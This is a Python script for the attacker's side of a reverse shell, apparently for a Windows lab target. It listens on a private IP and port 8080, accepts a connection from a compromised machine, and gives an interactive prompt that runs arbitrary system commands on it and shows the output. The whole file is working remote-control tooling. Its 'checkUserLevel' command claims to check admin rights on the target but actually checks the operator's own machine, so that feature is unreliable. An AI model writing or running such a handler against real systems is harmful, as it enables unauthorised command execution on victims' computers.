import socket
import os
import ctypes

def check_admin_access():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0    # Windows admin check (non-zero = admin)
    except Exception as e:
        return f"Error checking admin status: {e}"           # Handle any exceptions during check

def connect():
    print("=" * 50)
    print("[+] Listening for incoming TCP connections on port 8080")
    mySocket = socket.socket()
    mySocket.bind(("192.168.83.128", 8080)) 
    mySocket.listen(1)
    connection, address = mySocket.accept()
    print("=" * 50)
    print(f"Connection established: {address}")
    print("Type 'help' to see available commands")
    
    while True:
        try:
            command = input("Shell > ")
            
            # Help menu with available commands
            if command == "help":
                print("\nAvailable Commands:")
                print("  pwd            - Show current working directory on target")
                print("  ls             - List files and folders in current directory")
                print("  cd <directory> - Change directory on target")
                print("  checkUserLevel - Check admin privileges on target")
                print("  terminate      - Close the connection and exit")
                print("  <command>      - Execute any other system command on target\n")
                continue
            
            # Check admin privileges locally
            elif command == "checkUserLevel":
                is_admin = check_admin_access()
                print(f"Admin privileges: {'YES' if is_admin else 'NO'}")
                continue
            
            # List current directory contents
            elif command == "ls":
                connection.send("dir".encode())  # Windows equivalent of ls
                response = connection.recv(5000).decode()
                print(response)
                
            # Get current working directory
            elif command == "pwd":
                connection.send("cd".encode())  # Windows command to show current directory
                response = connection.recv(5000).decode()
                print(response)
                
            # Close connection
            elif "terminate" in command:
                connection.send("terminate".encode())
                connection.close()
                print("Connection terminated")
                break
                
            # Handle all other commands
            else:
                connection.send(command.encode())
                response = connection.recv(8192).decode()  # Increased buffer size
                if not response:
                    print("Connection may have been closed by the client")
                    break
                print(response)
                
        except BrokenPipeError:
            print("Connection lost - the client has disconnected")
            break
        except ConnectionResetError:
            print("Connection was reset by the client")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    
    # Always ensure the socket is closed properly
    try:
        connection.close()
    except:
        pass

def main():
    try:
        connect()
    except Exception as e:
        print(f"Failed to establish connection: {e}")

if __name__ == "__main__":
    main()